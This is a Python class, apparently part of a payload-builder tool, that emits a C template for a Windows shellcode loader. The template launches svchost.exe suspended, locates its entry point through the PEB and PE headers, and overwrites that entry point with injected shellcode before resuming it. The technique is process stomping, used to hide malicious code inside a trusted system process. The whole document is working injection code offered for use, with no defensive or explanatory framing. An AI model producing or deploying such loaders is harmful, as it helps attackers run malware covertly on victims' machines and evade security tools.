class processstomp:

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <winternl.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
{imports}

{codeblocks}

NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG) = NULL;

int main()
{{
    
    {transformers}

    pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG))
        GetProcAddress(
            GetModuleHandle(TEXT("ntdll.dll")), 
            TEXT("NtQueryInformationProcess"));
    
    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    PPEB pPeb;
    PVOID pImage, pEntry;
    PIMAGE_NT_HEADERS pNtHeaders;
    LONG e_lfanew;
    SIZE_T NumberOfBytesRead;
    DWORD AddressOfEntryPoint;

    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;

    memset(&pbi, 0, sizeof(pbi));

    status = pNtQueryInformationProcess(
    pi.hProcess,
    ProcessBasicInformation,
    &pbi,
    sizeof(pbi),
    NULL);

    pPeb = pbi.PebBaseAddress;

    ReadProcessMemory(
        pi.hProcess,
        &pPeb->Reserved3[1],
        &pImage,
        sizeof(pImage),
        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(pImage);
        
    ReadProcessMemory(
        pi.hProcess,
        (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew),
        &e_lfanew,
        sizeof(e_lfanew),
        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(e_lfanew);
    pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);

    ReadProcessMemory(
        pi.hProcess,
        (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint),
        &AddressOfEntryPoint,
        sizeof(AddressOfEntryPoint),
        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(pEntry);
    pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
    
    WriteProcessMemory(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}}
"""